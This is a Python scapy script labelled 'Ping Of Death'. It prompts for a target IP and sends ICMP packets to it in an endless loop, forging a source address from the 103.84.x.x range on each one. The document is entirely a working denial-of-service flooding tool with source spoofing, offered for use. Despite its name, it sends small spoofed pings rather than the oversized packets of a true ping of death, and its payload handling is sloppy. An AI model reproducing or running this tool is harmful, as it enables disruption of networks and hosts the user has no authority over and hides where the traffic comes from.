from scapy.all import *
import sys
import random
import string
import os
class pingofdeath:
    def pingattack(self):
        os.system("clear")
        print('\n')
        print(os.system("figlet 'Ping Of Death' -f digital -c"))
        dip =input("Target IP : ")
        data =  string.ascii_lowercase

        i=1
        j=1
        while True:
            try:
                print(i*j , " -----packet send-----")
                i = i+1
                if(i == 255):
                    i=1
                    j = j+1
                sip = "103.84.{0}.{1}".format(j,i)
                data = random.choice(data) * 6
                pkgs = send([IP(src = sip ,dst=dip)/ICMP()/data])

            except KeyboardInterrupt:
                print("keyboard Inptupted")
                print('\n Bye Bye')
                exit(1)

if __name__ == "__main__":
    piatt = pingofdeath()
    piatt.pingattack()